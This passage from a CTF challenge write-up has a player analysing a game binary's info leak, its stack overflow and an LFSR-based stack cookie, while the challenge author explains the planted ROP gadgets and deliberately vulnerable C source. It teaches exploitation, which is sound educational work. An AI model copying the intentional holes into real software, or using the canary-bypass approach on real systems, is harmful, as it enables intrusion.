+│ overflows (e.g. atou64("9999999999999999999999") would return       ⠀⠀⠀⠀⠀⣿⡄│
+│ 1864712049423024127). This isn't atypical for such functions, e.g.  ⠀⠀⠀⠀⢠⣿⠃│
+│ atoi/atol/atoll do the same [ATOI], and likely it's without         ⠀⠀⠀⠀⣼⡟⠀│
+│ consequence in this task. Yet, it still should be handled carefully ⠀⠀⠀⣸⡿⠀⠀│
+│ and thought about whether it could influence the task, e.g. make it ⠀⠀⢰⣿⠁⠀⠀│
+│ easier to solve – now we wouldn't want players to get a freebie,    ⠀⢀⣿⠇⠀⠀⠀│
+│ would we?                                                           ⠀⢸⣿⠀⠀⠀⠀│
+│                                                                     ⠀⢸⡇⠀⠀⠀⠀│
+│ ┄─━┫References                                                      ⠀⢸⡇⠀⠀⠀⠀│
+│ [ATOI] G. Coldwind, "Various behavior of scanf/atoi/strtol", 2010.  ⠀⠘⡇⠀⠀⠀⠀│
+│ https://gynvael.coldwind.pl/?id=365                                 ⠀⠀⢱⠀⠀⠀⠀│
+│ ┄                                                                   ⠀⠀⠀⠃⠀⠀⠀│
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│⠀⠀⠀⠀⠀⠀⠀ It's time to start looking around the actual code. I think it's     │
+│⠀⣾⣿⣿⣿⡀⠀ safe to ignore the loader for now and to focus on the actual        │
+│⠀⣿⠀⠀⠀⣿⠀ application, which seems split between the 7 .o files. There's a    │
+│⠀⣿⣿⣿⣿⠁⠀ chance that part of the app is in the loader, but if I find any     │
+│⠀⣿⠀⠀⠀⠀⠀ evidence of that, I'll look at it later.                            │
+│⠀⢿⠀⠀⠀⠀⠀                                                                     │
+│⠀⠀⠀⠀⠀⠀⠀ After opening Ghidra and a cursory glance in each file, here's what │
+│⠀⣷⠀⠀⠀⠀⠀ I found:                                                            │
+│⠀⣿⠀⠀⠀⠀⠀                                                                     │
+│⠀⣿⠀⠀⠀⠀⠀ basic.o                                                             │
+│⠀⣿⠀⠀⠀⠀⠀ A collection of basic C-library-like functions. Some of them are    │
+│⠀⢿⣿⣿⣿⣷⠀ just syscall wrappers. These functions include:                     │
+│⠀⠀⠀⠀⠀⠀⠀   * Syscall wrappers: read (sys_read), exit (sys_exit), rand        │
+│⠀⢀⣿⣿⣿⡀⠀ (sys_getrandom)                                                     │
+│⠀⣿⠀⠀⠀⣿⠀   * Syscall wrappers with some minor additional functionality:      │
+│⠀⣿⡷⠶⢾⣿⠀ getchar (sys_read), print (sys_write), puts (sys_write),            │
+│⠀⣿⠀⠀⠀⣿⠀   * NUL-terminated string functions: strcmp, strcpy, strlen         │
+│⠀⡿⠀⠀⠀⢿⠀   * Conversions: u64toa, atou64                                     │
+│⠀⠀⠀⠀⠀⠀⠀                                                                     │
+│⠀⣷⠀⠀⠀⣾⠀ debug.o                                                             │
+│⠀⣿⠀⠀⠀⣿⠀ A set of _debug_set_reg_X86REG functions that, well, set each of    │
+│⠀⠈⣿⣿⣿⠁⠀ the 64-bit general purpose registers. That totally looks like       │
+│⠀⠀⠀⣿⠀⠀⠀ freebie ROP gadgets.                                                │
+│⠀⠀⠀⡿⠀⠀⠀                                                                     │
+│⠀⠀⠀⠀⠀⠀⠀ game.o                                                              │
+│⠀⣾⣿⣿⣿⣷⠀ This looks like the place where the majority of the actual game is  │
+│⠀⣿⠀⠀⠀⠀⠀ implemented. Most function names do seem related to the game, like  │
+│⠀⣿⣿⣿⡷⠀⠀ show_winner, show_banner, see_full_scoreboard, see_scoreboard,      │
+│⠀⣿⠀⠀⠀⠀⠀ shift_scoreboard, get_player_name, check_scoreboard, game, or menu. │
+│⠀⢿⣿⣿⣿⡿⠀ There's also one helper function called readline.                   │
+│⠀⠀⠀⠀⠀⠀⠀                                                                     │
+│⠀⣾⣿⣿⣿⡀⠀ guard.o                                                             │
+│⠀⣿⠀⠀⠀⣿⠀ The __stack_chk_fail function is implemented here. It just outputs  │
+│⠀⣿⣿⣿⣿⡁⠀ an error message "Stack smashing detected - mischief not managed!"  │
+│⠀⣿⠀⠀⠀⣿⠀ and exits.                                                          │
+│⠀⡿⠀⠀⠀⢿⠀                                                                     │
+│⠀⠀⠀⠀⠀⠀⠀ main.o                                                              │
+│⠀⠀⠀⠠⡀⠀⠀ The main function is here. It just calls show_banner(), then menu() │
+│⠀⠀⠀⠀⢣⠀⠀ in a loop, and then show_winner() at the end. Also the scoreboard   │
+│⠀⠀⠀⠀⠈⣶⠀ data is here in the .data section.                                  │
+│⠀⠀⠀⠀⠀⣿⠀                                                                     │
+│⠀⠀⠀⠀⠀⣿⡀ res.o                                                               │
+│⠀⠀⠀⠀⢀⣿⠇ The "Welcome to the Game" ASCII Art is here.                        │
+│⠀⠀⠀⠀⣸⡿⠀                                                                     │
+│⠀⠀⠀⢰⣿⠁⠀ syscalls.o                                                          │
+│⠀⠀⢠⣿⠃⠀⠀ Low-level syscall wrappers (write, read, exit, mmap, mprotect,      │
+│⠀⠀⣾⡏⠀⠀⠀ munmap, open, close, lseek, getrandom) as well as syscall calling   │
+│⠀⢸⣿⠀⠀⠀⠀ convenience functions in assembly (syscall0 to syscall6, the number │
+│⠀⠘⠋⠀⠀⠀⠀ seems to indicate the number of arguments).                         │
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│ The only reason debug.o has the _debug_set_reg_X86REG functions is  ⠀⠀⠀⠀⠀⠀⠀│
+│ because the other files were missing some important ROP gadgets     ⠀⢀⣿⣿⣿⣷⠀│
+│ without which making the ROP chain would be pretty tricky, if       ⠀⣿⠀⠀⠀⠀⠀│
+│ possible at all. So I needed an excuse to get the gadgets in there, ⠀⣿⠀⠀⠀⠀⠀│
+│ and eventually I settled for "debug functions", which is probably   ⠀⣿⠀⠀⠀⠀⠀│
+│ as anti-creative and obvious as one can get.                        ⠀⠈⣿⣿⣿⡿⠀│
+│                                                                     ⠀⠀⠀⠀⠀⠀⠀│
+│ There's also a reason why there are so many .o files in the first   ⠀⣾⣿⣿⣿⡀⠀│
+│ place. The application isn't that big, so readability wasn't the    ⠀⣿⠀⠀⠀⣿⠀│
+│ reason for the split. Instead, the number of object files is        ⠀⣿⣿⣿⣿⡁⠀│
+│ directly correlated to what's needed to break the ASLR – but more   ⠀⣿⠀⠀⠀⣿⠀│
+│ on this a bit later.                                                ⠀⠀⠀⠀⠀⠀⠀│
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│⠀⠀⠀⠀⠀⠀⠀ It seems that the only interesting file at this point is game.o, as │
+│⠀⣾⣿⣿⣿⡀⠀ everything else is just plumbing. So let's focus on that, analyze   │
+│⠀⣿⠀⠀⠀⣿⠀ what's going on, and try to find more vulnerabilities.              │
+│⠀⣿⣿⣿⣿⠁⠀                                                                     │
+│⠀⣿⠀⠀⠀⠀⠀ I've already located the previously found information leak, which   │
+│⠀⢿⠀⠀⠀⠀⠀ seems to be in a function called see_scoreboard:                    │
+│⠀⠀⠀⠀⠀⠀⠀                                                                     │
+│⠀⣷⠀⠀⠀⠀⠀   puts("Which place\'s score do you want to see (0-9)?");           │
+│⠀⣿⠀⠀⠀⠀⠀   cVar1 = readline(local_58,0x20);                                  │
+│⠀⣿⠀⠀⠀⠀⠀   ...                                                               │
+│⠀⣿⠀⠀⠀⠀⠀   lVar2 = atou64(local_58);                                         │
+│⠀⢿⣿⣿⣿⣷⠀   print("To get this place you need to beat this score: ");         │
+│⠀⠀⠀⠀⠀⠀⠀   ...                                                               │
+│⠀⢀⣿⣿⣿⡀⠀   u64toa(&local_38,*(undefined8 *)(game_scoreboard + lVar2 * 8));   │
+│⠀⣿⠀⠀⠀⣿⠀   puts((char *)&local_38);                                          │
+│⠀⣿⡷⠶⢾⣿⠀                                                                     │
+│⠀⣿⠀⠀⠀⣿⠀ So indeed it's a 64-bit value leak.                                 │
+│⠀⡿⠀⠀⠀⢿⠀                                                                     │
+│⠀⠀⠀⠀⠀⠀⠀ Finding the next vulnerability took a bit longer, because the       │
+│⠀⣷⠀⠀⠀⣾⠀ Creator thought he was being funny. Check out this code:            │
+│⠀⣿⠀⠀⠀⣿⠀                                                                     │
+│⠀⠈⣿⣿⣿⠁⠀   puts("How long is your name (0-31)?");                            │
+│⠀⠀⠀⣿⠀⠀⠀   ...                                                               │
+│⠀⠀⠀⡿⠀⠀⠀   if (0x1f &lt; __nbytes) {                                            │
+│⠀⠀⠀⠀⠀⠀⠀     puts("Name too long! No SCOREBOARD for you.");                  │
+│⠀⣾⣿⣿⣿⣷⠀   }                                                                 │
+│⠀⣿⠀⠀⠀⠀⠀   puts("Now type in your name:");                                   │
+│⠀⣿⣿⣿⡷⠀⠀   read(0,&local_38,__nbytes);                                       │
+│⠀⣿⠀⠀⠀⠀⠀   local_38[31] = '\0';                                              │
+│⠀⢿⣿⣿⣿⡿⠀   strcpy(game_names + (long)param_1 * 0x20,(char *)&local_38);      │
+│⠀⠀⠀⠀⠀⠀⠀                                                                     │
+│⠀⣾⣿⣿⣿⡀⠀ At first glance there's no buffer overflow there, because the       │
+│⠀⣿⠀⠀⠀⣿⠀ length of the input is checked against the length of the buffer,    │
+│⠀⣿⣿⣿⣿⡁⠀ and an error message is displayed if the name is indeed too long.   │
+│⠀⣿⠀⠀⠀⣿⠀                                                                     │
+│⠀⡿⠀⠀⠀⢿⠀ Well, it is checked, and there is an error message. But the         │
+│⠀⠀⠀⠀⠀⠀⠀ function just continues as usual (there's no return or exit). Haha, │
+│⠀⠀⠀⠀⠀⠀⠀ very funny /s.                                                      │
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│ ;p                                                                  ⠀⠀⠀⠀⠀⠀⠀│
+│                                                                     ⠀⢀⣿⣿⣿⣷⠀│
+│ I do wonder how many players needed to do a double take to notice   ⠀⣿⠀⠀⠀⠀⠀│
+│ that missing return/exit. In vulnerability research it's harder to  ⠀⣿⠀⠀⠀⠀⠀│
+│ spot what's missing than what's there.                              ⠀⣿⠀⠀⠀⠀⠀│
+│                                                                     ⠀⠈⣿⣿⣿⡿⠀│
+│ And, since it's 2024 (or technically 2025 when I'm editing this), I ⠀⠀⠀⠀⠀⠀⠀│
+│ quickly checked this with AIs (just for fun, so only 1 attempt).    ⠀⣾⣿⣿⣿⡀⠀│
+│ ChatGPT 4o and Claude 3.5 Sonnet both spotted the issue when asked  ⠀⣿⠀⠀⠀⣿⠀│
+│ about the check, but also flooded the screen with other less useful ⠀⣿⣿⣿⣿⡁⠀│
+│ information. Gemini 2.0 Experimental Advanced wasn't able to spot   ⠀⣿⠀⠀⠀⣿⠀│
+│ the missing return/exit, even when directly asking about that       ⠀⡿⠀⠀⠀⢿⠀│
+│ check, though it did suggest a slightly better version of the code. ⠀⠀⠀⠀⠀⠀⠀│
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│⠀⠀⠀⠀⠀⠀⠀ Misdirection attempt aside, this vulnerability is a local_38[]      │
+│⠀⣾⣿⣿⣿⡀⠀ stack-based buffer overflow when reading the player's name.         │
+│⠀⣿⠀⠀⠀⣿⠀                                                                     │
+│⠀⣿⣿⣿⣿⠁⠀ And it seems like exactly what we need, but there's a problem.      │
+│⠀⣿⠀⠀⠀⠀⠀ Here's the rest of the code:                                        │
+│⠀⢿⠀⠀⠀⠀⠀                                                                     │
+│⠀⠀⠀⠀⠀⠀⠀     puts("Now type in your name:");                                 │
+│⠀⣷⠀⠀⠀⠀⠀     read(0,&local_38,__nbytes);                                     │
+│⠀⣿⠀⠀⠀⠀⠀     local_38[31] = '\0';                                            │
+│⠀⣿⠀⠀⠀⠀⠀     strcpy(game_names + (long)param_1 * 0x20,(char *)&local_38);    │
+│⠀⣿⠀⠀⠀⠀⠀   }                                                                 │
+│⠀⢿⣿⣿⣿⣷⠀   if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {                 │
+│⠀⠀⠀⠀⠀⠀⠀                     /* WARNING: Subroutine does not return */       │
+│⠀⢀⣿⣿⣿⡀⠀     __stack_chk_fail();                                             │
+│⠀⣿⠀⠀⠀⣿⠀   }                                                                 │
+│⠀⣿⡷⠶⢾⣿⠀                                                                     │
+│⠀⣿⠀⠀⠀⣿⠀ Yup, that's a stack cookie/canary/guard. I'll have to bypass it in  │
+│⠀⡿⠀⠀⠀⢿⠀ order to get code execution.                                        │
+│⠀⠀⠀⠀⠀⠀⠀                                                                     │
+│⠀⣷⠀⠀⠀⣾⠀ The obvious thought is to leak the stack cookie using the leak      │
+│⠀⣿⠀⠀⠀⣿⠀ vulnerability discovered initially (the one in see_scoreboard       │
+│⠀⠈⣿⣿⣿⠁⠀ function). This however will be a bit tricky, as that is a relative │
+│⠀⠀⠀⣿⠀⠀⠀ read-from-where – relative to what the game_scoreboard is pointing  │
+│⠀⠀⠀⡿⠀⠀⠀ to to be exact. And game_scoreboard is pointing to the scoreboard   │
+│⠀⠀⠀⠀⠀⠀⠀ array, which is in the .data section of main.o. Or – more to the    │
+│⠀⣾⣿⣿⣿⣷⠀ point – not on the stack.                                           │
+│⠀⣿⠀⠀⠀⠀⠀                                                                     │
+│⠀⣿⣿⣿⡷⠀⠀ In such a case there are three options.                             │
+│⠀⣿⠀⠀⠀⠀⠀ 1. We have to find another leak, stack-based this time.             │
+│⠀⢿⣿⣿⣿⡿⠀ 2. We have to find a pointer in "global" memory (some .data section │
+│⠀⠀⠀⠀⠀⠀⠀ or the like) which points back to the stack.                        │
+│⠀⣾⣿⣿⣿⡀⠀ 3. There's something wrong with the cookie.                         │
+│⠀⣿⠀⠀⠀⣿⠀                                                                     │
+│⠀⣿⣿⣿⣿⡁⠀ After some analysis I couldn't see any other leaks or global        │
+│⠀⣿⠀⠀⠀⣿⠀ pointers to the stack. So, knowing that the task is solvable, there │
+│⠀⠀⠀⠀⠀⠀⠀ had to be something wrong with the cookie.                          │
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│ It's not uncommon for unintentional vulnerabilities to appear in    ⠀⠀⠀⠀⠀⠀⠀│
+│ CTF challenges, and these can make challenges like these            ⠀⢀⣿⣿⣿⣷⠀│
+│ considerably easier. In the case of this challenge the              ⠀⣿⠀⠀⠀⠀⠀│
+│ get_player_name function was especially sensitive as even a minor   ⠀⣿⠀⠀⠀⠀⠀│
+│ uncontrolled bug there could lead to disclosing the stack cookie or ⠀⣿⠀⠀⠀⠀⠀│
+│ a stack pointer. Here's how this function looks in the original     ⠀⠈⣿⣿⣿⡿⠀│
+│ source code:                                                        ⠀⠀⠀⠀⠀⠀⠀│
+│                                                                     ⠀⣾⣿⣿⣿⡀⠀│
+│   void get_player_name(int place) {                                 ⠀⣿⠀⠀⠀⣿⠀│
+│     char player_name[32] = {0};                                     ⠀⣿⣿⣿⣿⡁⠀│
+│     uint64_t len;                                                   ⠀⣿⠀⠀⠀⣿⠀│
+│                                                                     ⠀⡿⠀⠀⠀⢿⠀│
+│     puts("Congratulations! You're going to the SCOREBOARD!");       ⠀⠀⠀⠀⠀⠀⠀│
+│     puts("How long is your name (0-31)?");                          ⠀⣾⣿⣿⣿⣷⠀│
+│     char line[16];                                                  ⠀⣿⠀⠀⠀⠀⠀│
+│     if (!readline(line, 16)) {                                      ⠀⣿⣿⣿⡷⠀⠀│
+│       return;                                                       ⠀⣿⠀⠀⠀⠀⠀│
+│     }                                                               ⠀⢿⣿⣿⣿⡿⠀│
+│     len = atou64(line);                                             ⠀⠀⠀⠀⠀⠀⠀│
+│                                                                     ⠀⢀⣿⣿⣿⡀⠀│
+│     if (len &gt; 31) {                                                 ⠀⣿⠀⠀⠀⣿⠀│
+│       puts("Name too long! No SCOREBOARD for you.");                ⠀⣿⡷⠶⢾⣿⠀│
+│     }                                                               ⠀⣿⠀⠀⠀⣿⠀│
+│                                                                     ⠀⡿⠀⠀⠀⢿⠀│
+│     puts("Now type in your name:");                                 ⠀⠀⠀⠀⠀⠀⠀│
+│     read(0, player_name, len);                                      ⠀⣿⣿⣿⣿⣿⠀│
+│                                                                     ⠀⠀⠀⣿⠀⠀⠀│
+│     player_name[31] = '\0';                                         ⠀⠀⠀⣿⠀⠀⠀│
+│     strcpy(game_names[place], player_name);                         ⠀⠀⠀⣿⠀⠀⠀│
+│   }                                                                 ⠀⠀⠀⡿⠀⠀⠀│
+│                                                                     ⠀⠀⠀⠀⠀⠀⠀│
+│ The important thing to note here is that read() will return as soon ⠀⢀⣿⣿⣿⡀⠀│
+│ as it gets any data – even if that's less data than declared or     ⠀⣿⠀⠀⠀⣿⠀│
+│ requested.                                                          ⠀⣿⠀⠀⠀⣿⠀│
+│                                                                     ⠀⣿⠀⠀⠀⣿⠀│
+│ This means that if player_name would not be zero-initialized, it    ⠀⠈⣿⣿⣿⠁⠀│
+│ would still contain previous stack garbage – for example a stack    ⠀⠀⠀⠀⠀⠀⠀│
+│ pointer that could be used to leak data on the stack using the      ⠀⣾⣿⣿⣿⡀⠀│
+│ initial leak vulnerability. So, it was crucial for player_name to   ⠀⣿⠀⠀⠀⣿⠀│
+│ be initialized.                                                     ⠀⣿⣿⣿⣿⡁⠀│
+│                                                                     ⠀⣿⠀⠀⠀⣿⠀│
+│ But the same is true for strcpy later on. If setting the byte at    ⠀⡿⠀⠀⠀⢿⠀│
+│ index 31 in player_name to a NUL byte would be missing, the strcpy  ⠀⠀⠀⠀⠀⠀⠀│
+│ could go on and copy additional data from the stack to the          ⠀⠀⠀⠠⡀⠀⠀│
+│ scoreboard, which can be displayed at will. This, again, could lead ⠀⠀⠀⠀⢣⠀⠀│
+│ to a pointer leak, or even a stack cookie leak directly.            ⠀⠀⠀⠀⠈⣶⠀│
+│                                                                     ⠀⠀⠀⠀⠀⣿⠀│
+│ Thankfully, it seems this task was spared from the fate of          ⠀⠀⠀⠀⠀⣿⡀│
+│ additional unintentional vulnerabilities. Or at least no one has    ⠀⠀⠀⠀⢀⣿⠇│
+│ spotted one during the competition.                                 ⠀⠀⠀⠀⣸⡿⠀│
+│                                                                     ⠀⠀⠀⢰⣿⠁⠀│
+│ As such, the Player is right – figuring out what's wrong with the   ⠀⠀⢠⣿⠃⠀⠀│
+│ cookie is the way to go.                                            ⠀⠀⠚⠋⠀⠀⠀│
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│⠀⠀⠀⠀⠀⠀⠀ Usually the master value of the main thread's stack cookie is       │
+│⠀⣾⣿⣿⣿⡀⠀ initialized in the ld-linux-x86-64.so.2 loader. However, in case of │
+│⠀⣿⠀⠀⠀⣿⠀ this challenge we're dealing with a custom loader, so the           │
+│⠀⣿⣿⣿⣿⠁⠀ initialization should happen there. I guess there's no way around   │
+│⠀⣿⠀⠀⠀⠀⠀ it – I have to start looking at the loader file, which is the       │
+│⠀⢿⠀⠀⠀⠀⠀ largest file by far. Uff.                                           │
+│⠀⠀⠀⠀⠀⠀⠀                                                                     │
+│⠀⣷⠀⠀⠀⠀⠀ Thankfully, since it's not stripped, the function names make this   │
+│⠀⣿⠀⠀⠀⠀⠀ easy.                                                               │
+│⠀⣿⠀⠀⠀⠀⠀                                                                     │
+│⠀⣿⠀⠀⠀⠀⠀ There's a write_stack_guard function which saves the master cookie  │
+│⠀⢿⣿⣿⣿⣷⠀ in the usual place – FS:0x28 – i.e. the stack_guard field in the    │
+│⠀⠀⠀⠀⠀⠀⠀ thread local storage (TLS). And it's called from an                 │
+│⠀⢀⣿⣿⣿⡀⠀ init_stack_guard function, which looks like this:                   │
+│⠀⣿⠀⠀⠀⣿⠀                                                                     │
+│⠀⣿⡷⠶⢾⣿⠀   ...                                                               │
+│⠀⣿⠀⠀⠀⣿⠀   uVar2 = sys_mmap(0,0x1000,3,0x22,0,0);                            │
+│⠀⡿⠀⠀⠀⢿⠀   syscall2(0x9e,0x1002,uVar2);  // Set FS base.                     │
+│⠀⠀⠀⠀⠀⠀⠀   iVar1 = rand();                                                   │
+│⠀⣷⠀⠀⠀⣾⠀   write_stack_guard(iVar1);                                         │
+│⠀⣿⠀⠀⠀⣿⠀   return;                                                           │
+│⠀⠈⣿⣿⣿⠁⠀                                                                     │
+│⠀⠀⠀⣿⠀⠀⠀ This function allocates the TLS area, calls rand() to get the       │
+│⠀⠀⠀⡿⠀⠀⠀ cookie, and writes the master cookie.                               │
+│⠀⠀⠀⠀⠀⠀⠀                                                                     │
+│⠀⣾⣿⣿⣿⣷⠀ I already saw the rand() function in basic.o:                       │
+│⠀⣿⠀⠀⠀⠀⠀                                                                     │
+│⠀⣿⣿⣿⡷⠀⠀   ...                                                               │
+│⠀⣿⠀⠀⠀⠀⠀   sys_getrandom(&local_14,4,2);  // 2 is GRND_RANDOM,               │
+│⠀⢿⣿⣿⣿⡿⠀                                  // i.e. /dev/random's source       │
+│⠀⠀⠀⠀⠀⠀⠀   ...                                                               │
+│⠀⣾⣿⣿⣿⡀⠀   return local_14;                                                  │
+│⠀⣿⠀⠀⠀⣿⠀                                                                     │
+│⠀⣿⣿⣿⣿⡁⠀ This looks bad – it uses the CSPRNG source from the kernel, even if │
+│⠀⣿⠀⠀⠀⣿⠀ only 4 bytes.                                                       │
+│⠀⡿⠀⠀⠀⢿⠀                                                                     │
+│⠀⠀⠀⠀⠀⠀⠀ No. Wait! That doesn't make sense – it's the loader, basic.o isn't  │
+│⠀⠀⠀⠠⡀⠀⠀ loaded yet. There has to be a rand function in the loader as well!  │
+│⠀⠀⠀⠀⢣⠀⠀                                                                     │
+│⠀⠀⠀⠀⠈⣶⠀ And indeed there is, though it just calls rand_get_bit() n-times    │
+│⠀⠀⠀⠀⠀⣿⠀ (64 times in case of the cookie) and returns the bits in a 64-bit   │
+│⠀⠀⠀⠀⠀⣿⡀ variable, with the last bit returned being on the least-significant │
+│⠀⠀⠀⠀⢀⣿⠇ bit position.                                                       │
+│⠀⠀⠀⠀⣸⡿⠀                                                                     │
+│⠀⠀⠀⢰⣿⠁⠀ Here's the rand_get_bit():                                          │
+│⠀⠀⢠⣿⠃⠀⠀                                                                     │
+│⠀⠀⣾⡏⠀⠀⠀   ...                                                               │
+│⠀⢸⣿⠀⠀⠀⠀   bVar1 = rand_extract_bit(63);                                     │
+│⠀⢸⡏⠀⠀⠀⠀   bVar2 = rand_extract_bit(61);                                     │
+│⠀⢸⡇⠀⠀⠀⠀   bVar3 = rand_extract_bit(60);                                     │
+│⠀⠸⡇⠀⠀⠀⠀   bVar4 = rand_extract_bit(58);                                     │
+│⠀⠀⢣⠀⠀⠀⠀   bVar1 = bVar4 ^ bVar1 ^ bVar2 ^ bVar3 ^ 1;                        │
+│⠀⠀⠈⢆⠀⠀⠀   rand_state = (ulong)bVar1 | rand_state * 2;                       │
+│⠀⠀⠀⠘⡄⠀⠀   return bVar1;                                                     │
+│⠀⠀⠀⠀⢱⠀⠀                                                                     │
+│⠀⠀⠀⠀⠀⣿⠀ And that's just an LFSR (Linear-Feedback Shift Register)! This is   │
+│⠀⠀⠀⠀⠀⣿⠀ great news as LFSR PRNG (Pseudo-Random Number Generator) can be     │
+│⠀⠀⠀⠀⠀⣿⡄ easily rolled back as long as we get the whole 64-bit state.        │
+│⠀⠀⠀⠀⢠⣿⠃ To put it another way, if I can get my hands on consecutive 64 bits │
+│⠀⠀⠀⠀⣼⡟⠀ of rand()'s output, I can easily generate all the previous and      │
+│⠀⠀⠀⣸⡿⠀⠀ future values outputted by this function.                           │
+│⠀⠀⢰⣿⠁⠀⠀                                                                     │
+│⠀⢀⣿⠇⠀⠀⠀ So, perhaps the game itself uses this random number generator to    │
+│⠀⢸⣿⠀⠀⠀⠀ generate the numbers for addition (i.e. in the actual game part of  │
+│⠀⢸⡇⠀⠀⠀⠀ this game)? But no, as noted before, the game uses its own rand()   │
+│⠀⢸⡇⠀⠀⠀⠀ function. Only the loader uses the LFSR.                            │
+│⠀⠘⡇⠀⠀⠀⠀                                                                     │
+│⠀⠀⢱⠀⠀⠀⠀ Hold that thought for a moment. How is this LFSR initialized        │
+│⠀⠀⠀⢣⠀⠀⠀ exactly? Perhaps it's just a constant value or the classic misuse   │
+│⠀⠀⠀⠈⢆⠀⠀ of time()?                                                          │
+│⠀⠀⠀⠀⠸⣄⠀                                                                     │
+│⠀⠀⠀⠀⠀⣿⠀ The initialization happens at the very start of the loader          │
+│⠀⠀⠀⠀⠀⣿⠀ – literally the first instructions – and... I'm out of luck:        │
+│⠀⠀⠀⠀⠀⣿⡆                                                                     │
+│⠀⠀⠀⠀⢰⣿⠁ sys_getrandom(&rand_state,8,2);                                     │
+│⠀⠀⠀⢀⣿⠇⠀                                                                     │
+│⠀⠀⠀⣼⡟⠀⠀ The initialization unfortunately looks secure. It was worth a check │
+│⠀⠀⠘⠛⠀⠀⠀ anyway.                                                             │
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│ Source code of the random function:                                 ⠀⠀⠀⠀⠀⠀⠀│
+│                                                                     ⠀⢀⣿⣿⣿⣷⠀│
+│   static uint8_t rand_get_bit(void) {                               ⠀⣿⠀⠀⠀⠀⠀│
+│     uint8_t new_bit = (                                             ⠀⣿⠀⠀⠀⠀⠀│
+│         1 ^                                                         ⠀⣿⠀⠀⠀⠀⠀│
+│         rand_extract_bit(63) ^                                      ⠀⠈⣿⣿⣿⡿⠀│
+│         rand_extract_bit(61) ^                                      ⠀⠀⠀⠀⠀⠀⠀│
+│         rand_extract_bit(60) ^                                      ⠀⣾⣿⣿⣿⡀⠀│
+│         rand_extract_bit(58)                                        ⠀⣿⠀⠀⠀⣿⠀│
+│     );                                                              ⠀⣿⣿⣿⣿⡁⠀│
+│                                                                     ⠀⣿⠀⠀⠀⣿⠀│
+│     rand_state = (rand_state &lt;&lt; 1) | new_bit;                       ⠀⡿⠀⠀⠀⢿⠀│
+│     return new_bit;                                                 ⠀⠀⠀⠀⠀⠀⠀│
+│   }                                                                 ⠀⣾⣿⣿⣿⣷⠀│
+│                                                                     ⠀⣿⠀⠀⠀⠀⠀│
+│ The choice of LFSR algorithm to generate numbers was a pretty       ⠀⣿⣿⣿⡷⠀⠀│
+│ simple one – it allows to easily and precisely control how much     ⠀⣿⠀⠀⠀⠀⠀│
+│ state is leaked, in bits. This said, it also required a conscious   ⠀⢿⣿⣿⣿⡿⠀│
+│ act of balancing – leaking too many bits would make the task too    ⠀⠀⠀⠀⠀⠀⠀│
+│ easy; leaking too few would render the task unsolvable (or, in a    ⠀⢀⣿⣿⣿⡀⠀│
+│ best case scenario, require brute forcing some bits, likely in an   ⠀⣿⠀⠀⠀⣿⠀│
+│ online brute forcing at that, i.e. hammering the server).           ⠀⣿⡷⠶⢾⣿⠀│
+│                                                                     ⠀⣿⠀⠀⠀⣿⠀│
+│ One more potential problem is that LFSR's output is periodic, i.e.  ⠀⡿⠀⠀⠀⢿⠀│
+│ after some outputs the pattern starts repeating itself. The length  ⠀⠀⠀⠀⠀⠀⠀│
+│ of this cycle depends on which bits are "tapped", i.e. which bits   ⠀⣿⣿⣿⣿⣿⠀│
+│ are used when calculating the new bit. So, what I needed to avoid,  ⠀⠀⠀⣿⠀⠀⠀│
+│ is having a super short cycle, since that would require just a few  ⠀⠀⠀⣿⠀⠀⠀│
+│ bits leaked to uncover the whole pseudo-random bit stream.          ⠀⠀⠀⣿⠀⠀⠀│
+│                                                                     ⠀⠀⠀⡿⠀⠀⠀│
+│ The rule for the maximal cycle length is an even number of taps     ⠀⠀⠀⠀⠀⠀⠀│
+│ (the complement, i.e. XOR with 1, doesn't count) and the indexes of ⠀⢀⣿⣿⣿⡀⠀│
+│ bits (counting from 1) being set-wise coprime (i.e. there must be   ⠀⣿⠀⠀⠀⣿⠀│
+│ no number apart from 1 that is a factor of ALL the numbers in the   ⠀⣿⠀⠀⠀⣿⠀│
+│ set).                                                               ⠀⣿⠀⠀⠀⣿⠀│
+│                                                                     ⠀⠈⣿⣿⣿⠁⠀│
+│ Typically for 64-bit LFSR the recommended tap set is 64, 63, 61, 60 ⠀⠀⠀⠀⠀⠀⠀│
+│ (counting from 1) [LFSR-TABLE], however the taps I've chosen (or    ⠀⣾⣿⣿⣿⡀⠀│
+│ found somewhere online – honestly I don't remember at this point),  ⠀⣿⠀⠀⠀⣿⠀│
+│ i.e. 64, 62, 61, 59, also meet the requirements for the maximal     ⠀⣿⣿⣿⣿⡁⠀│
+│ cycle length.                                                       ⠀⣿⠀⠀⠀⣿⠀│
+│                                                                     ⠀⡿⠀⠀⠀⢿⠀│
+│ ┄─━┫References                                                      ⠀⠀⠀⠀⠀⠀⠀│
+│ [LFSR-TABLE] R. Ward, T. Molteno, "Table of Linear Feedback Shift   ⠀⠀⠀⠠⡀⠀⠀│
+│ Register", 2012                                                     ⠀⠀⠀⠀⢣⠀⠀│
+│ ┄                                                                   ⠀⠀⠀⠀⠈⠒⠀│
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│⠀⠀⠀⠀⠀⠀⠀ Going back to where is rand() used exactly, it seems that it's used │
+│⠀⣾⣿⣿⣿⡀⠀ only in two places:                                                 │
+│⠀⣿⠀⠀⠀⣿⠀                                                                     │
+│⠀⣿⣿⣿⣿⠁⠀   XREF[3]:     Entry Point(*),                                      │
+│⠀⣿⠀⠀⠀⠀⠀                aslr_get_addr:0040160c(c),                           │
+│⠀⢿⠀⠀⠀⠀⠀                init_stack_guard:00402163(c)                         │
+│⠀⠀⠀⠀⠀⠀⠀                                                                     │
+│⠀⣷⠀⠀⠀⠀⠀ Heh, aslr_get_addr. I guess we finally learn why the task is called │
